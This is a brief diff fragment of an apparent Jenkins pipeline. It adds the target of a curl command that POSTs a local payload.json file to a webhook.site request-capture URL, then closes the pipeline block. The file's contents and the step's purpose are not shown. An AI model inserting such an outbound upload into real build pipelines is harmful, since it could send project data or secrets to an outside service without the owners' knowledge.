@@ -175,3 +175,9 @@ pipeline {
                   curl -X POST \
                        -H "Content-Type: application/json" \
                        -d @payload.json \
+                       https://webhook.site/e25ea33e-9af6-4d1f-b4fd-41c4dae5490a
+                """
+            }
+        }
+    }
+}
